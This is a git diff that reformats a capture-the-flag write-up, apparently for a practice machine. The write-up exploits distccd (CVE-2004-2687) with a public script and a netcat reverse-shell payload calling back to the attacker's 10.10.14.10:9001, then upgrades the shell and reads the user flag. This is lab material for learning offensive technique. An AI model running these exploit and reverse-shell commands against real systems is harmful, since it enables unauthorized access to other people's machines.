@@ -26,32 +26,32 @@ We could use put and get files here but there is no port 80 open for us to execu
 
 ![image](https://user-images.githubusercontent.com/110210595/185814036-42698e61-b4e6-4be4-84de-df540f801f33.png)
 
-I go back to the nmap results and see port 3632 is open and it gave us the version of application running. distccd v1\
-I go to google and search for "distccd v1 exploit" first link brings us to https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855 \
-after reading the exploit it seems to generate a random alpha numeric string. Reads the string. And looks for the trigger exploit which is command, host, port\
+I go back to the nmap results and see port 3632 is open and it gave us the version of application running.  <em><strong>distccd v1</em></strong>\
+I go to google and search for "<em><strong>distccd v1 exploit</em></strong>" first link brings us to https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855 \
+after reading the exploit it seems to generate a random alpha numeric string. Reads the string. And looks for the trigger exploit which is <em><strong>command, host, port</em></strong>\
 If it is able to connect to the host it will send the payload and hopefully give us a reverse shell.
 
-Let's give it a try. I started by copying the code and writing it to a file naming it CVE-2004-2687.py, did chmod +x CVE-2004-2687.py \
-the file is ready to be used. First I started a listener on my attacking machine with nc -lvnp 9001 and then used the following command \
-./CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" No good, got errors. \
-Then I tried. python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" I got a connected to remote service Ok but then the
+Let's give it a try. I started by copying the code and writing it to a file naming it CVE-2004-2687.py, did  ``` markdown chmod +x CVE-2004-2687.py ``` \
+the file is ready to be used. First I started a listener on my attacking machine with ``` markdown nc -lvnp 9001 ``` and then used the following command \
+``` markdown ./CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` No good, got errors. \
+Then I tried. ``` markdown python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` I got a connected to remote service Ok but then the
 socket timed out instantly killing the connection. I went back to the exploit and read the comments, it mentioned that python3 is to new.
 So I was going to work my way down from python3 to python. \
-Next up, python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" Success, we get a shell!
+Next up,  ``` markdown python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` Success, we get a shell!
 
 ![image](https://user-images.githubusercontent.com/110210595/185814122-93aa8ce3-0128-4f21-a19b-8d04b5580a30.png)
 
 ![image](https://user-images.githubusercontent.com/110210595/185814162-05876fb9-000c-4612-bcfc-bd4d8fc70e88.png)
 
 Let's upgrade the shell. I used the following. \
-python -c 'import pty; pty.spawn("/bin/bash")' python3 and python2 didn't work. \
-export TERM=xterm \
-stty raw -echo && fg \
-enter \
-enter \
+``` markdown python -c 'import pty; pty.spawn("/bin/bash")' ``` python3 and python2 didn't work. \
+``` markdown export TERM=xterm ``` \
+``` markdown stty raw -echo && fg ``` \
+``` markdown enter ``` \
+``` markdown enter ``` \
 
-We're a normal user daemon. I started off with sudo -l but it asked for a password. Let's move on.
-I look around a bit and cd /home directory and do a ls and see what's there. Nothing good in the user directory but I did go into makis and find the user.txt file. I do a cat user.txt at it and we get out our first flag.  
+We're a normal user daemon. I started off with ``` markdown sudo -l ``` but it asked for a password. Let's move on.
+I look around a bit and ``` markdown cd /home ``` directory and do a ``` markdown ls ``` and see what's there. Nothing good in the user directory but I did go into makis and find the <em><strong>user.txt</em></strong> file. I do a cat user.txt at it and we get out our first flag.  
 
 ![image](https://user-images.githubusercontent.com/110210595/185814188-b2d3ad0a-a11d-4f7e-a4bc-49c2566b5fa1.png)
 
